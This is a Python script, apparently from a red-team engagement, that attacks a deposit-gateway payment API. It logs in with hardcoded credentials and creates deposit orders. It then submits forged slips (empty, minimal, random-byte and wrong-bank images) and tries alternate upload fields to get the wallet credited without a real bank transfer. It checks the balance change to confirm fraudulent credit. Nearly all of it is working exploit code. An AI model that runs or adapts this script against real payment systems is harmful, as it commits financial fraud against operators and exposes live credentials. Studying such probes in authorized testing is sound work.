#!/usr/bin/env python3
"""
probe_gw_slip.py — Probe deposit-gateway-slip confirmation endpoint
Engagement: WE88Z-VAK88-2026-09

Attack scenario: Can we submit a forged/fake slip against a deposit-gateway order
to trigger a wallet credit without a real bank transfer?

Evidence required for [CONFIRMED]: wallet balance increases after fake slip.

Flow:
  1. POST /mb/deposit-gateway → fresh order_id + mule bank
  2. POST /mb/deposit-gateway-slip (multipart) with file + payment_type_code + order_id
  3. Check wallet balance delta
"""
import requests, json, pathlib, time, io, os, base64, struct, zlib

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
JWT_F = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2")

REAL_SLIP = pathlib.Path("/tmp/944DAD59-6AF9-4BB3-9020-A93495F4006D.jpeg")

def get_jwt():
    cached = JWT_F.read_text().strip() if JWT_F.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    r.raise_for_status()
    jwt = r.json()["accessToken"]
    JWT_F.write_text(jwt)
    return jwt

JWT  = get_jwt()
HDRS = {"Authorization": f"Bearer {JWT}", "template": "vn",
        "languagecode": "th", "Origin": "https://m.vak88z2.com"}

def get_wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers={**HDRS, "Content-Type": "application/json"}, timeout=10)
    if r.ok:
        d = r.json()
        if isinstance(d, list): d = d[0]
        return d.get("balance") or d.get("data", [{}])[0].get("balance") if isinstance(d.get("data"), list) else d.get("data", {}).get("balance", d.get("balance", "?"))
    return f"ERR:{r.status_code}"

def new_order(bank_detail_id, amount=100):
    r = requests.post(f"{MGAPI}/mb/deposit-gateway",
        headers={**HDRS, "Content-Type": "application/json"},
        json={"id": bank_detail_id, "deposit_amount": amount,
              "deposit_token": None, "deposit_account_id": None},
        timeout=20)
    if not r.ok:
        return None, f"HTTP {r.status_code}: {r.text[:100]}"
    d = r.json()
    return d.get("order_id"), d

def submit_slip(order_id, payment_type_code, file_bytes, filename, content_type, label=""):
    files = {"file": (filename, io.BytesIO(file_bytes), content_type)}
    data  = {"payment_type_code": payment_type_code, "order_id": order_id}
    r = requests.post(f"{MGAPI}/mb/deposit-gateway-slip",
        headers=HDRS,  # no Content-Type — let requests set multipart boundary
        files=files, data=data, timeout=20)
    print(f"  [{label}] HTTP {r.status_code}: {r.text[:300]}")
    return r

def minimal_png():
    """1×1 white PNG"""
    def chunk(name, data):
        c = zlib.crc32(name + data) & 0xffffffff
        return struct.pack(">I", len(data)) + name + data + struct.pack(">I", c)
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    idat = zlib.compress(b'\x00\xff\xff\xff')
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr) +
            chunk(b'IDAT', idat) + chunk(b'IEND', b''))

def minimal_jpeg():
    """Minimal valid JPEG (SOI + EOI)"""
    return bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00,
                  0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                  0xFF, 0xD9])

# ── 0. Baseline ───────────────────────────────────────────────────────────────
print("=== Baseline wallet ===")
bal_before = get_wallet()
print(f"  Balance: {bal_before} THB")

# ── 1. Fresh SCB order ────────────────────────────────────────────────────────
SCB_DETAIL = "fa6310c6-45c2-4500-8cf9-2ebcb7428ac0"
print("\n=== Fresh SCB deposit-gateway order ===")
order_id, order_resp = new_order(SCB_DETAIL, amount=100)
if not order_id:
    print(f"  Failed: {order_resp}")
    exit(1)
print(f"  order_id : {order_id}")
print(f"  mule     : {order_resp.get('dest_bank_code')} {order_resp.get('dest_bank_no')} — {order_resp.get('dest_bank_account_name')}")
print(f"  expires  : {order_resp.get('expired')}")
print(f"  amount   : {order_resp.get('amount')} THB")

# ── 2. Probe slip endpoint — no file at all ───────────────────────────────────
print("\n=== Slip submission probes ===")

# 2a. No file — just form fields
r0 = requests.post(f"{MGAPI}/mb/deposit-gateway-slip",
    headers=HDRS,
    data={"payment_type_code": "SCB", "order_id": order_id},
    timeout=15)
print(f"  [no-file]       HTTP {r0.status_code}: {r0.text[:200]}")

# 2b. Empty file
submit_slip(order_id, "SCB", b"", "slip.jpg", "image/jpeg", "empty-jpg")

# 2c. Minimal JPEG
submit_slip(order_id, "SCB", minimal_jpeg(), "slip.jpg", "image/jpeg", "minimal-jpeg")

# 2d. Minimal PNG renamed to .jpg
submit_slip(order_id, "SCB", minimal_png(), "slip.jpg", "image/jpeg", "png-as-jpg")

# 2e. Random bytes
submit_slip(order_id, "SCB", os.urandom(1024), "slip.jpg", "image/jpeg", "random-bytes")

# 2f. Real KBank slip (wrong bank but real image)
if REAL_SLIP.exists():
    real_bytes = REAL_SLIP.read_bytes()
    submit_slip(order_id, "SCB", real_bytes, "slip.jpg", "image/jpeg", f"real-kbank-slip ({len(real_bytes)//1024}KB)")
else:
    print("  [real-slip] NOT FOUND — skip")

# 2g. Try alternate field names for file
print("\n=== Alternate field name probes ===")
for field_name in ["slip", "image", "photo", "attachment", "upload"]:
    files = {field_name: ("slip.jpg", io.BytesIO(minimal_jpeg()), "image/jpeg")}
    data  = {"payment_type_code": "SCB", "order_id": order_id}
    r = requests.post(f"{MGAPI}/mb/deposit-gateway-slip",
        headers=HDRS, files=files, data=data, timeout=12)
    if r.status_code not in (400, 422, 415):
        print(f"  [{field_name}=slip.jpg] HTTP {r.status_code}: {r.text[:150]}")
    else:
        print(f"  [{field_name}=slip.jpg] HTTP {r.status_code} (validation err)")

# ── 3. Fresh TRUEWALLET order + slip ─────────────────────────────────────────
print("\n=== Try with TRUEWALLET ===")
TW_DETAIL = "e6227d1c-2fc6-4b04-86f9-863cb3067c21"
tw_order_id, tw_resp = new_order(TW_DETAIL, amount=100)
if tw_order_id:
    print(f"  order_id : {tw_order_id}")
    print(f"  mule     : {tw_resp.get('dest_bank_code')} {tw_resp.get('dest_bank_no')}")
    submit_slip(tw_order_id, "TRUEWALLET", minimal_jpeg(), "slip.jpg", "image/jpeg", "tw-minimal")
    if REAL_SLIP.exists():
        submit_slip(tw_order_id, "TRUEWALLET", REAL_SLIP.read_bytes(), "slip.jpg", "image/jpeg", "tw-real-kbank")
else:
    print(f"  Failed: {tw_resp}")

# ── 4. Check deposit transaction log ─────────────────────────────────────────
print("\n=== Deposit transaction status ===")
r_tx = requests.get(f"{MGAPI}/mb/deposit-transaction",
    headers={**HDRS, "Content-Type": "application/json"},
    params={"$limit": 5, "$sort[createdAt]": -1},
    timeout=10)
if r_tx.ok:
    txs = r_tx.json()
    if isinstance(txs, dict): txs = txs.get("data", txs)
    if isinstance(txs, list):
        for tx in txs[:5]:
            print(f"  id={tx.get('id','?')[:8]}.. order={tx.get('order_id','?')[:8]}.. "
                  f"status={tx.get('status','?'):12} amount={tx.get('amount','?')}")
    else:
        print(f"  {json.dumps(txs)[:300]}")
else:
    print(f"  HTTP {r_tx.status_code}: {r_tx.text[:100]}")

# ── 5. Final balance ──────────────────────────────────────────────────────────
time.sleep(2)
bal_after = get_wallet()
print(f"\n=== Wallet delta ===")
print(f"  Before : {bal_before} THB")
print(f"  After  : {bal_after} THB")
try:
    delta = float(bal_after) - float(bal_before)
    print(f"  Delta  : {delta:+.2f} THB {'← CREDIT CONFIRMED' if delta > 0 else ''}")
except:
    print(f"  Delta  : (parse error)")
print("=== DONE ===")
